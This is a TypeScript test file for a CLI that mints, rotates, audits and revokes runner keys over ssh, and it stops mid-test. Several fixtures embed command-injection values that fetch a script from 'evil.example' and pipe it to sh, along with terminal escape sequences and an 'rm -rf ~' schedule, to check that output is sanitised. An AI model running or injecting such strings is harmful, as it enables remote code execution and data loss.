// tb runner (src/runner-keys.ts): the main Mac makes a key for another runner
// and puts it in that Mac's secrets/convex-key over ssh, never printing it.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { tmpDir } from '../helpers/fakes.ts';
import { runnerKeysCommand, remoteCommand, REMOTE_ADMIN_CHECK, convexScratchDir } from '../../src/runner-keys.ts';
import { spawnSync } from 'node:child_process';

const URL_ = 'https://opulent-moose-249.ap-southeast-2.convex.cloud';

const OWN_ID = 'm5runner0001';

// The other Mac's answer to tb runner's look for admin credentials:
// 'deploy-env', 'cli-login', 'panel <name>', then 'checked'; 'down' is ssh failing.
let sshCheck = (lines: string[]) => (lines.includes('down') ? { ok: false, out: '', err: 'Connection refused' } : { ok: true, out: [...lines, 'checked'].map((l) => l + '\n').join(''), err: '' });

function setup(remoteJson: unknown = { sync: { url: URL_, runnerId: 'cb921b2447ea', name: 'bruce' } }, known: string[] = [], remoteFiles: string[] = []) {
  const home = tmpDir();
  fs.mkdirSync(path.join(home, 'secrets'), { recursive: true });
  fs.writeFileSync(path.join(home, 'secrets', 'convex-key'), 'owner-key\n');
  const calls: { fn: string; args: Record<string, unknown> }[] = [];
  const sshCalls: { host: string; command: string; input?: string }[] = [];
  const printed: string[] = [];
  let writeOk = true;
  let rotating = false;
  let nextValue = '';
  const audit: Record<string, Record<string, unknown>[]> = {
    tokens: [{ kind: 'token', id: 'tokens:1', version: 'v1', name: "Mike's iPhone", tokenKind: 'phone', createdAt: '2026-10-01T00:00:00Z', expiresAt: '2027-10-01T00:00:00Z' }],
    runnerKeys: [{ kind: 'key', id: 'runnerKeys:1', version: 'v1', runnerId: 'cb921b2447ea', name: 'bruce', createdAt: '2026-11-05T00:00:00Z', mainMac: false }],
    schedules: [{ kind: 'schedule', id: 'schedules:1', version: 'u', scheduleId: 'S', runnerId: OWN_ID, title: 'Nightly', text: 'rm -rf ~', cwd: '/', permissionMode: 'full', createdAt: 'c' }],
    runnerSchedules: [],
    cards: [{ kind: 'card', id: 'pocketCards:1', version: 'u', title: 'Deploy', threadId: 'T', updatedAt: 'u' }],
    messages: [{ kind: 'message', id: 'messages:9', version: '9', threadId: 'T', seq: 5, text: 'planted' }],
    replyImages: [{ kind: 'picture', id: 'replyImages:3', version: '3', table: 'replyImages', threadId: 'T', seq: 6, path: 'p.png' }],
    shareImages: [],
  };
  let deployKeys: { name: string; creationTime: number; lastUsedTime?: number }[] | undefined;
  const convexCalls: { args: string[]; input?: string }[] = [];
  const deps = {
    convex: (args: string[], input?: string) => {
      if (args[0] === 'env' && args[1] === 'get') return { ok: true, out: nextValue + '\n', err: '' };
      convexCalls.push({ args, ...(input !== undefined ? { input } : {}) });
      if (args[1] === 'set' && args[2] === 'RUNNER_KEY_NEXT') nextValue = input ?? '';
      return { ok: true, out: '', err: '' };
    },
    heads: async () => [{ threadId: 'T', lastSeq: 4 }],
    deployKeys: async () => deployKeys,
    host: 'm5',
    post: async (_kind: string, fn: string, args: Record<string, unknown>) => {
      calls.push({ fn, args });
      if (fn === 'sync:addRunnerKey') return { runnerId: args.runnerId, key: 'tbr_secret_value' };
      if (fn === 'sync:revokeRunnerKey') return 1;
      if (fn === 'sync:runnersList') return [OWN_ID, ...known].map((runnerId) => ({ runnerId, name: `${runnerId}-name`, lastSeenAt: Date.parse('2026-11-05T10:00:00Z') }));
      if (fn === 'sync:audit') return { ownerKeyPrint: 'aaaaaaaa', rows: audit[args.section as string] ?? [] };
      if (fn === 'sync:auditRemove') return 1;
      if (fn === 'sync:listRunnerKeys') return { keys: [], rotating };
      if (fn === 'sync:setRunnerLogins') return (args.logins as unknown[]).length;
      if (fn === 'sync:runnerLogins') return [{ runnerId: 'cb921b2447ea', name: 'bruce\u001b[2J', live: true, shared: [{ provider: 'claude', email: 'mike@example.com' }], claimed: [{ provider: 'claude', email: 'mike@example.com' }, { provider: 'claude', email: 'guess@\u001b]0;x' }] }];
      return [];
    },
    ssh: (host: string, command: string, input?: string) => {
      sshCalls.push({ host, command, ...(input !== undefined ? { input } : {}) });
      if (command.startsWith('cat ')) return { ok: true, out: JSON.stringify(remoteJson), err: '' };
      if (command.includes('convex-panels')) return sshCheck(remoteFiles);
      return { ok: writeOk, out: '', err: writeOk ? '' : 'Permission denied' };
    },
    userHome: home,
    print: (s: string) => void printed.push(s),
    fail: (s: string) => void printed.push(s),
  };
  const cfg = { home, sync: { enabled: true, url: URL_, runnerId: OWN_ID } };
  return { cfg, deps, calls, sshCalls, printed, convexCalls, audit, keys: (k: typeof deployKeys) => void (deployKeys = k), failWrite: () => void (writeOk = false), rotate: (on: boolean) => void (rotating = on), setNext: (v: string) => void (nextValue = v) };
}

test("tb runner add --ssh makes a key for that Mac's own runner id and writes it there over stdin", async () => {
  const s = setup();
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 0);
  assert.deepEqual(s.calls.filter((c) => c.fn === 'sync:addRunnerKey'), [{ fn: 'sync:addRunnerKey', args: { key: 'owner-key', runnerId: 'cb921b2447ea', name: 'bruce', ownerRunnerId: OWN_ID, replace: false } }]);
  const write = s.sshCalls.find((c) => c.command.includes('convex-key.new'))!;
  assert.equal(write.input, 'tbr_secret_value\n');
  assert.match(write.command, /convex-key\.new" && mv "\$d\/convex-key\.new" "\$d\/convex-key"/);
  assert.doesNotMatch(write.command, /tbr_secret_value/, 'not on the command line');
  assert.ok(!s.printed.join('\n').includes('tbr_secret_value'), 'never printed');
  assert.match(s.printed.join('\n'), /restart/);
});

const minted = (s: ReturnType<typeof setup>) => s.calls.filter((c) => c.fn === 'sync:addRunnerKey').map((c) => c.args.runnerId);

test('tb runner add refuses a mismatched id or another deployment, before making anything', async () => {
  let s = setup();
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce', id: 'someoneelse' }, s.deps), 1);
  s = setup({ sync: { url: 'https://other.convex.cloud', runnerId: 'cb921b2447ea' } });
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 1);
  assert.deepEqual(minted(s), []);
  // Somewhere to put it is required: the key is never printed.
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], {}, s.deps), 1);
});

test("a Mac that names this Mac's runner id, or one the deployment has, gets no key unless this Mac says so", async () => {
  // Bruce's runner.json, tampered with, claims to be the M5.
  let s = setup({ sync: { url: URL_, runnerId: OWN_ID } });
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 1);
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce', id: OWN_ID }, s.deps), 1);
  assert.deepEqual(minted(s), []);
  // Some other runner the deployment knows: only with --id from this side.
  s = setup({ sync: { url: URL_, runnerId: 'tinkerdesk01' } }, ['tinkerdesk01']);
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 1);
  assert.match(s.printed.join('\n'), /--id tinkerdesk01/);
  assert.deepEqual(minted(s), []);
  // --id alone isn't enough for a runner the deployment has: it says which, and wants --replace.
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce', id: 'tinkerdesk01' }, s.deps), 1);
  assert.match(s.printed.join('\n'), /tinkerdesk01-name/);
  assert.match(s.printed.join('\n'), /last seen/);
  assert.match(s.printed.join('\n'), /--replace/);
  assert.deepEqual(minted(s), []);
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce', id: 'tinkerdesk01', replace: true }, s.deps), 0);
  assert.deepEqual(minted(s), ['tinkerdesk01']);
  assert.equal(s.calls.find((c) => c.fn === 'sync:addRunnerKey')!.args.replace, true);
  // --out can't name this Mac either.
  s = setup();
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'x'], { out: path.join(s.cfg.home, 'k'), id: OWN_ID }, s.deps), 1);
  assert.deepEqual(minted(s), []);
});

test('a Mac whose runner has no id yet gets one this Mac picks, written into its runner.json', async () => {
  const s = setup({ sync: { name: 'new' }, port: 8797 });
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'new'], { ssh: 'new' }, s.deps), 0);
  const [id] = minted(s) as string[];
  assert.match(id!, /^[0-9a-f]{12}$/);
  const json = s.sshCalls.find((c) => c.command.includes('runner.json.new'))!;
  assert.deepEqual(JSON.parse(json.input!), { sync: { name: 'new', url: URL_, runnerId: id }, port: 8797 });
});

test("a key that couldn't be written over ssh is revoked again", async () => {
  const s = setup();
  s.failWrite();
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 1);
  assert.deepEqual(s.calls.map((c) => c.fn).filter((fn) => /RunnerKey$/.test(fn)), ['sync:addRunnerKey', 'sync:revokeRunnerKey']);
});

test('tb runner add --out writes an owner-only file', async () => {
  const s = setup();
  const file = path.join(s.cfg.home, 'out', 'bruce.key');
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { out: file, id: 'cb921b2447ea' }, s.deps), 0);
  assert.equal(fs.readFileSync(file, 'utf8'), 'tbr_secret_value\n');
  assert.equal(fs.statSync(file).mode & 0o777, 0o600);
  assert.ok(!s.printed.join('\n').includes('tbr_secret_value'));
});

test("on a runner key's Mac, tb runner says only the main Mac can", async () => {
  const s = setup();
  const deps = {
    ...s.deps,
    post: async () => {
      throw Object.assign(new Error('Server Error'), { data: { kind: 'forbidden', message: "This runner's key can't call listRunnerKeys: only the main Mac's key (the deployment's RUNNER_KEY) can." } });
    },
  };
  assert.equal(await runnerKeysCommand(s.cfg, ['list'], {}, deps), 1);
  assert.match(s.printed.join('\n'), /only the main Mac's key .* Run tb runner on the main Mac/);
});

// Plain JS with no types, as setup runs before any packages are installed.
type Plan = (p: { envGet: { status: number; stdout: string; stderr: string }; local: string; joining: boolean }) => { action: string; why?: string };
const planModule: string = '../../../scripts/runner-key-plan.mjs';
const { runnerKeyPlan, isJoining } = (await import(planModule)) as { runnerKeyPlan: Plan; isJoining: (p: { existing: boolean; local: string }) => boolean };

test('setup never sets RUNNER_KEY on a joining Mac, and a failed read never looks like an unset one', () => {
  const failed = { status: 1, stdout: '', stderr: 'network error' };
  const unset = { status: 0, stdout: '', stderr: '✖ Environment variable "RUNNER_KEY" not found' };
  const set = { status: 0, stdout: 'owner\n', stderr: '' };
  // A joining Mac leaves keys alone whatever the read said: its own comes from tb runner add.
  for (const envGet of [failed, unset, set]) for (const local of ['', 'owner', 'tbr_x']) assert.equal(runnerKeyPlan({ envGet, local, joining: true }).action, 'joined');
  // The first Mac: a failed read stops it.
  assert.equal(runnerKeyPlan({ envGet: failed, local: '', joining: false }).action, 'fail');
  // Nothing back and no "not found": not taken as unset either.
  assert.equal(runnerKeyPlan({ envGet: { status: 0, stdout: '', stderr: '' }, local: '', joining: false }).action, 'fail');
  const noNext = { status: 0, stdout: '', stderr: 'Environment variable "RUNNER_KEY_NEXT" not found' };
  assert.equal(runnerKeyPlan({ envGet: unset, nextGet: noNext, local: '', joining: false } as never).action, 'set');
  assert.equal(runnerKeyPlan({ envGet: set, nextGet: noNext, local: '', joining: false } as never).action, 'copy');
  assert.equal(runnerKeyPlan({ envGet: set, local: 'owner', joining: false }).action, 'keep');
});

test("a Mac whose runner id isn't one as written (spaces, \"any\") gets no key", async () => {
  for (const runnerId of [` ${OWN_ID} `, `${OWN_ID}\n`, 'any', 'a/b']) {
    const s = setup({ sync: { url: URL_, runnerId } });
    assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 1, JSON.stringify(runnerId));
    assert.deepEqual(minted(s), []);
  }
  const s = setup();
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { out: path.join(s.cfg.home, 'k'), id: 'any' }, s.deps), 1);
  assert.deepEqual(minted(s), []);
});

test('tb runner add warns when the other Mac also has a deploy key or a Convex login', async () => {
  const s = setup(undefined, [], ['deploy-env', 'cli-login', 'panel threadbear-panel-bruce-abc123']);
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'bruce'], { ssh: 'bruce' }, s.deps), 0);
  const out = s.printed.join('\n');
  assert.match(out, /convex-deploy\.env/);
  assert.match(out, /convex logout/);
  // Revoke on Convex's side first, by name, then rotate: deleting a file revokes nothing.
  assert.match(out, /[Rr]evoke/);
  assert.match(out, /deployment token delete threadbear-panel-bruce-abc123 --deployment opulent-moose-249/);
  assert.match(out, /https:\/\/dashboard\.convex\.dev\/d\/opulent-moose-249\/settings/);
  assert.match(out, /rotate-owner/);
  // tb runner check --ssh says the same on its own, and fails.
  const c = setup(undefined, [], ['cli-login']);
  assert.equal(await runnerKeysCommand(c.cfg, ['check'], { ssh: 'bruce' }, c.deps), 1);
  const clean = setup();
  assert.equal(await runnerKeysCommand(clean.cfg, ['check'], { ssh: 'bruce' }, clean.deps), 0);
  // A look that couldn't be made isn't a clean one.
  const down = setup(undefined, [], ['down']);
  assert.equal(await runnerKeysCommand(down.cfg, ['check'], { ssh: 'bruce' }, down.deps), 1);
  assert.match(down.printed.join('\n'), /couldn't/i);
  const panels = setup(undefined, [], ['panel threadbear-panel-bruce-abc123']);
  assert.equal(await runnerKeysCommand(panels.cfg, ['check'], { ssh: 'bruce' }, panels.deps), 1);
});

test("tb runner check on a Mac with a runner key says if a deploy key is still there", async () => {
  const s = setup();
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-key'), 'tbr_mine\n');
  assert.equal(await runnerKeysCommand(s.cfg, ['check'], {}, s.deps), 0);
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-deploy.env'), 'CONVEX_DEPLOY_KEY=prod:x|y\n');
  assert.equal(await runnerKeysCommand(s.cfg, ['check'], {}, s.deps), 1);
  assert.match(s.printed.join('\n'), /convex-deploy\.env/);
  // The Convex panel's cached deploy keys count too.
  fs.rmSync(path.join(s.cfg.home, 'secrets', 'convex-deploy.env'));
  fs.mkdirSync(path.join(s.cfg.home, 'secrets', 'convex-panels'));
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-panels', 'opulent-moose-249.json'), JSON.stringify({ name: 'threadbear-panel-bruce-ff00aa', adminKey: 'prod:secret' }));
  s.printed.length = 0;
  assert.equal(await runnerKeysCommand(s.cfg, ['check'], {}, s.deps), 1);
  assert.match(s.printed.join('\n'), /threadbear-panel-bruce-ff00aa/);
  assert.doesNotMatch(s.printed.join('\n'), /prod:secret/);
});

test('tb runner list says when RUNNER_KEY_NEXT is still set', async () => {
  const s = setup();
  s.rotate(true);
  assert.equal(await runnerKeysCommand(s.cfg, ['list'], {}, s.deps), 0);
  assert.match(s.printed.join('\n'), /RUNNER_KEY_NEXT/);
});

test('tb runner rotate-owner moves the main key with no gap: NEXT first, this Mac\'s key, then RUNNER_KEY', async () => {
  const s = setup();
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-deploy.env'), 'CONVEX_DEPLOY_KEY=prod:x|y\n');
  const keyFile = path.join(s.cfg.home, 'secrets', 'convex-key');
  // Keys this Mac made itself, as it recorded them when it made them.
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'made-deploy-keys'), 'threadbear-runner-m5\nthreadbear-panel-m5-a1b2c3\n');
  s.keys([{ name: 'threadbear-runner-m5', creationTime: 1 }, { name: 'threadbear-panel-m5-a1b2c3', creationTime: 2 }]);
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], {}, s.deps), 0);
  const fresh = fs.readFileSync(keyFile, 'utf8').trim();
  assert.match(fresh, /^[0-9a-f]{64}$/);
  assert.equal(fs.statSync(keyFile).mode & 0o777, 0o600);
  assert.deepEqual(s.convexCalls, [{ args: ['env', 'set', 'RUNNER_KEY_NEXT'], input: fresh }]);
  assert.ok(!s.printed.join('\n').includes(fresh), 'never printed');
  assert.match(s.printed.join('\n'), /restart/);
  // It never says every copy is dead: only that the old main key is.
  assert.doesNotMatch(s.printed.join('\n'), /every copy/);
  // Started twice: refused while NEXT is set.
  s.rotate(true);
  // Finishing with a key that isn't NEXT (setup copied the old one back) promotes nothing.
  fs.writeFileSync(keyFile, 'owner-key\n');
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], { finish: true }, s.deps), 1);
  assert.equal(s.convexCalls.length, 1);
  fs.writeFileSync(keyFile, fresh + '\n');
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], {}, s.deps), 1);
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], { finish: true }, s.deps), 0);
  assert.deepEqual(s.convexCalls.slice(1), [{ args: ['env', 'set', 'RUNNER_KEY'], input: fresh }, { args: ['env', 'remove', 'RUNNER_KEY_NEXT'] }]);
  // Without a deploy key there's nothing to set it with.
  const n = setup();
  assert.equal(await runnerKeysCommand(n.cfg, ['rotate-owner'], {}, n.deps), 1);
  assert.deepEqual(n.convexCalls, []);
});

test("a Mac that joined (its key is a runner key) is never handed the main key or made the owner by setup", () => {
  const set = { status: 0, stdout: 'owner\n', stderr: '' };
  const unset = { status: 0, stdout: '', stderr: '✖ Environment variable "RUNNER_KEY" not found' };
  // Setup run again on Bruce without --existing still knows it joined.
  assert.equal(isJoining({ existing: false, local: 'tbr_mine' }), true);
  assert.equal(isJoining({ existing: true, local: '' }), true);
  assert.equal(isJoining({ existing: false, local: 'owner' }), false);
  assert.equal(isJoining({ existing: false, local: '' }), false);
  // And the plan itself never copies over or promotes a runner key.
  assert.notEqual(runnerKeyPlan({ envGet: set, local: 'tbr_mine', joining: false }).action, 'copy');
  assert.notEqual(runnerKeyPlan({ envGet: unset, local: 'tbr_mine', joining: false }).action, 'set');
});

test('tb runner add gives a Mac set up without Convex the deployment as well as its key', async () => {
  const s = setup({ sync: { runnerId: 'fresh0000001', name: 'new' } });
  assert.equal(await runnerKeysCommand(s.cfg, ['add', 'new'], { ssh: 'new' }, s.deps), 0);
  const json = s.sshCalls.find((c) => c.command.includes('runner.json.new'))!;
  assert.deepEqual(JSON.parse(json.input!).sync, { runnerId: 'fresh0000001', name: 'new', url: URL_ });
});

test("the runner id check is the backend's", async () => {
  const { RUNNER_ID } = await import('../../src/runner-keys.ts');
  const access = await import('../../../convex/runnerAccess.ts');
  assert.equal(RUNNER_ID.source, access.RUNNER_ID.source);
});

test('every ssh to the other Mac turns agent and port forwarding off', async () => {
  const { SSH_OPTIONS } = await import('../../src/runner-keys.ts');
  assert.ok(SSH_OPTIONS.join(' ').includes('ForwardAgent=no'));
  assert.ok(SSH_OPTIONS.join(' ').includes('ClearAllForwardings=yes'));
  assert.ok(SSH_OPTIONS.join(' ').includes('BatchMode=yes'));
});

test('tb runner audit numbers what the old shared key could have left, and --drop takes exact rows by number', async () => {
  const s = setup();
  s.audit.schedules!.push({ kind: 'schedule', id: 'schedules:2', version: 'u', scheduleId: 'x;curl -s https://evil.example/s|sh;#', runnerId: OWN_ID, title: '\u001b[2Kinnocent', text: 'x', cwd: '/', permissionMode: 'full', createdAt: 'c' });
  s.audit.runnerSchedules!.push({ kind: 'schedule', id: 'schedules:3', version: 'u', scheduleId: 'b', runnerId: 'cb921b2447ea', title: "Bruce's own", text: 'y', createdAt: 'c' });
  assert.equal(await runnerKeysCommand(s.cfg, ['audit'], {}, s.deps), 0);
  const out = s.printed.join('\n');
  for (const want of [/Mike's iPhone/, /rm -rf ~/, /full/, /planted/, /p\.png/, /Bruce's own/]) assert.match(out, want);
  // Nothing anyone else chose goes into a command, and no control characters at all.
  assert.doesNotMatch(out, /\u001b/);
  assert.doesNotMatch(out, /--drop [^\n]*curl/);
  const snap = out.match(/--snapshot ([0-9a-f]{12})/)![1]!;
  assert.match(out, /^ *1\. /m);
  // Asked with this Mac's own runner id, so a key made for it is flagged.
  assert.equal(s.calls.find((c) => c.fn === 'sync:audit' && c.args.section === 'runnerKeys')!.args.ownRunnerId, OWN_ID);
  // Rows by number, against the same snapshot: the exact rows and the versions shown.
  assert.equal(await runnerKeysCommand(s.cfg, ['audit'], { remove: ['1,3,6'], snapshot: snap }, s.deps), 0);
  const removed = s.calls.find((c) => c.fn === 'sync:auditRemove')!.args.rows;
  assert.deepEqual(removed, [{ kind: 'token', id: 'tokens:1', version: 'v1' }, { kind: 'schedule', id: 'schedules:1', version: 'u' }, { kind: 'message', id: 'messages:9', version: '9' }]);
  // A runner key's own schedules changing doesn't change the snapshot.
  s.audit.runnerSchedules!.push({ kind: 'schedule', id: 'schedules:4', version: 'u', scheduleId: 'c', runnerId: 'cb921b2447ea', title: 'another', text: 'z', createdAt: 'c' });
  assert.equal(await runnerKeysCommand(s.cfg, ['audit'], { remove: ['1'], snapshot: snap }, s.deps), 0);
  // A list that changed since (a new version too), or no snapshot, or a number not on it: nothing goes.
  const n = s.calls.filter((c) => c.fn === 'sync:auditRemove').length;
  s.audit.tokens![0]!.version = 'v2';
  assert.equal(await runnerKeysCommand(s.cfg, ['audit'], { remove: ['1'], snapshot: snap }, s.deps), 1);
  assert.equal(await runnerKeysCommand(s.cfg, ['audit'], { remove: ['1'] }, s.deps), 1);
  assert.equal(await runnerKeysCommand(s.cfg, ['audit'], { remove: ['99'], snapshot: snap }, s.deps), 1);
  assert.equal(s.calls.filter((c) => c.fn === 'sync:auditRemove').length, n);
});

test('tb runner revoke --purge revokes, then takes out everything that runner wrote', async () => {
  const s = setup();
  let rounds = 0;
  const post = s.deps.post;
  const deps = { ...s.deps, post: async (kind: string, fn: string, args: Record<string, unknown>): Promise<unknown> => (fn === 'sync:purgeRunner' ? (s.calls.push({ fn, args }), { done: ++rounds >= 3 }) : post(kind, fn, args)) };
  assert.equal(await runnerKeysCommand(s.cfg, ['revoke', 'cb921b2447ea'], { purge: true }, deps), 0);
  assert.deepEqual(s.calls.map((c) => c.fn), ['sync:revokeRunnerKey', 'sync:purgeRunner', 'sync:purgeRunner', 'sync:purgeRunner']);
});

test("setup won't copy or set the main key while a rotation is under way", () => {
  const set = { status: 0, stdout: 'owner\n', stderr: '' };
  const unset = { status: 0, stdout: '', stderr: '✖ Environment variable "RUNNER_KEY" not found' };
  const next = { status: 0, stdout: 'newkey\n', stderr: '' };
  const noNext = { status: 0, stdout: '', stderr: '✖ Environment variable "RUNNER_KEY_NEXT" not found' };
  assert.equal(runnerKeyPlan({ envGet: set, nextGet: next, local: 'newkey', joining: false } as never).action, 'fail');
  assert.equal(runnerKeyPlan({ envGet: unset, nextGet: next, local: '', joining: false } as never).action, 'fail');
  assert.equal(runnerKeyPlan({ envGet: set, nextGet: { status: 1, stdout: '', stderr: 'x' }, local: 'other', joining: false } as never).action, 'fail');
  assert.equal(runnerKeyPlan({ envGet: set, nextGet: noNext, local: 'other', joining: false } as never).action, 'copy');
  assert.equal(runnerKeyPlan({ envGet: set, nextGet: next, local: 'owner', joining: false } as never).action, 'keep');
});

test("rotate-owner won't run while Convex lists a deploy key this Mac didn't make, unless it's been looked at", async () => {
  const s = setup();
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-deploy.env'), 'CONVEX_DEPLOY_KEY=prod:x|y\n');
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'made-deploy-keys'), 'threadbear-runner-m5\n');
  // Bruce's, one with no Mac in its name, and one named to look like this Mac's: none provably this Mac's.
  s.keys([{ name: 'threadbear-runner-m5', creationTime: 1 }, { name: 'threadbear-runner-bruce', creationTime: 2, lastUsedTime: 3 }, { name: 'threadbear-runner', creationTime: 4 }, { name: 'x; curl evil|sh \u001b[2K', creationTime: 5 }]);
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], {}, s.deps), 1);
  const out = s.printed.join('\n');
  assert.match(out, /threadbear-runner-bruce/);
  assert.match(out, /threadbear-runner,/);
  assert.match(out, /dashboard\.convex\.dev\/d\/opulent-moose-249\/settings/);
  assert.match(out, /CLI login/);
  assert.doesNotMatch(out, /\u001b/);
  assert.doesNotMatch(out, /token delete x; curl/);
  assert.deepEqual(s.convexCalls, []);
  // Looked at: --keys-checked goes ahead, after showing the list again.
  assert.equal(await runnerKeysCommand(s.cfg, ['rotate-owner'], { keysChecked: true }, s.deps), 0);
  // With no way to list them (no CONVEX_TEAM_TOKEN for this run): only with --keys-checked.
  const n = setup();
  fs.writeFileSync(path.join(n.cfg.home, 'secrets', 'convex-deploy.env'), 'CONVEX_DEPLOY_KEY=prod:x|y\n');
  n.keys(undefined);
  assert.equal(await runnerKeysCommand(n.cfg, ['rotate-owner'], {}, n.deps), 1);
  assert.match(n.printed.join('\n'), /--keys-checked/);
  assert.match(n.printed.join('\n'), /CONVEX_TEAM_TOKEN/);
  assert.equal(await runnerKeysCommand(n.cfg, ['rotate-owner'], { keysChecked: true }, n.deps), 0);
});

test("Convex's list of deploy keys is taken only in the shape it should have", async () => {
  const { listDeployKeys } = await import('../../src/runner-keys.ts');
  const ok = (body: unknown) => (async () => new Response(JSON.stringify(body), { status: 200 })) as unknown as typeof fetch;
  assert.deepEqual(await listDeployKeys(URL_, 'tok', ok([{ id: 1, name: 'a', creationTime: 2, allowedActions: [] }])), [{ name: 'a', creationTime: 2, lastUsedTime: undefined }]);
  for (const bad of [{ items: [] }, [{ nam: 'a' }], 'x', [{ name: 1, creationTime: 2 }]]) await assert.rejects(listDeployKeys(URL_, 'tok', ok(bad)), /shape/);
  assert.equal(await listDeployKeys(URL_, undefined, ok([])), undefined);
});

test('tb runner check counts a team token left on disk as admin credentials too', async () => {
  const s = setup();
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-key'), 'tbr_mine\n');
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-team-token'), 'secret\n');
  assert.equal(await runnerKeysCommand(s.cfg, ['check'], {}, s.deps), 1);
  assert.match(s.printed.join('\n'), /convex-team-token/);
  const r = setup(undefined, [], ['team-token']);
  assert.equal(await runnerKeysCommand(r.cfg, ['check'], { ssh: 'bruce' }, r.deps), 1);
  assert.match(r.printed.join('\n'), /team access token/);
});

test("a remote panel key's name is used only when it looks like one Threadbear made", async () => {
  const s = setup(undefined, [], ['panel x; curl https://evil.example|sh #', 'panel threadbear-panel-bruce-abc123']);
  assert.equal(await runnerKeysCommand(s.cfg, ['check'], { ssh: 'bruce' }, s.deps), 1);
  const out = s.printed.join('\n');
  assert.match(out, /deployment token delete threadbear-panel-bruce-abc123/);
  assert.doesNotMatch(out, /curl/);
  assert.match(out, /unrecognised name/);
});

test("revoke --purge won't touch this Mac's own runner", async () => {
  const s = setup();
  assert.equal(await runnerKeysCommand(s.cfg, ['revoke', OWN_ID], { purge: true }, s.deps), 1);
  assert.deepEqual(s.calls.filter((c) => /RunnerKey|purge/.test(c.fn)), []);
});

// A Mac's login shell is zsh, which aborts a line at a glob that matches
// nothing; the check over ssh used to fail on every Mac without a
// convex-panels folder (5 Nov 2026). A Linux runner needn't have zsh
// (INSTALL.md doesn't install it), so there the zsh test is skipped and
// the next runs under sh.
const ZSH = fs.existsSync('/bin/zsh') ? '/bin/zsh' : undefined;
test('the remote admin check runs under a zsh login shell with nothing to find', { skip: !ZSH && 'no /bin/zsh on this machine' }, () => {
  const home = tmpDir();
  const r = spawnSync(ZSH!, ['-c', remoteCommand(REMOTE_ADMIN_CHECK)], { env: { HOME: home, PATH: '/usr/bin:/bin' }, encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(r.stdout.trim().split('\n'), ['checked']);
});

test('the remote admin check still finds a panel key name, quotes and all', () => {
  const home = tmpDir();
  const d = path.join(home, 'Library/Application Support/Threadbear/secrets/convex-panels');
  fs.mkdirSync(d, { recursive: true });
  fs.writeFileSync(path.join(d, 'x.json'), '{"name":"threadbear-panel-bruce-abc123","adminKey":"secret"}');
  const r = spawnSync(ZSH ?? '/bin/sh', ['-c', remoteCommand(REMOTE_ADMIN_CHECK)], { env: { HOME: home, PATH: '/usr/bin:/bin' }, encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(r.stdout.trim().split('\n'), ['panel threadbear-panel-bruce-abc123', 'checked']);
});

// The Convex CLI's env commands need a folder whose package.json lists
// convex; rotate-owner ran from the data folder and failed (5 Nov 2026).
test('the Convex CLI runs from a private folder that lists convex and nothing else', () => {
  const dir = convexScratchDir();
  try {
    assert.equal(fs.statSync(dir).mode & 0o077, 0);
    assert.deepEqual(fs.readdirSync(dir), ['package.json']);
    assert.ok(JSON.parse(fs.readFileSync(path.join(dir, 'package.json'), 'utf8')).dependencies.convex);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// The 5 Nov 2026 rotation cut off the cloud runner: it still held the old
// shared key, and nothing said so until Sentry filled with "bad runner
// key". A runner the deployment has seen lately with no key of its own
// can only be heartbeating on the main key, so rotating it out is named
// first, and only goes ahead once it has a key or Mike says to lock it out.
test('rotate-owner names every other runner still on the main key, and --finish won\'t cut one off unless --lock-out says so', async () => {
  const s = setup(undefined, ['befe8df8975c', 'cb921b2447ea', 'oldmac000001']);
  fs.writeFileSync(path.join(s.cfg.home, 'secrets', 'convex-deploy.env'), 'CONVEX_DEPLOY_KEY=prod:x|y\n');
  s.keys([]);
  const now = Date.parse('2026-11-05T10:05:00Z');
  const post = s.deps.post;
  const deps = {
    ...s.deps,
    now: () => now,
    post: async (kind: string, fn: string, args: Record<string, unknown>) => {
      // Bruce has a key of its own; oldmac hasn't been seen for two months.
      if (fn === 'sync:listRunnerKeys') return { keys: [{ runnerId: 'cb921b2447ea', name: 'bruce', createdAt: 1 }], rotating: rotatingNow };
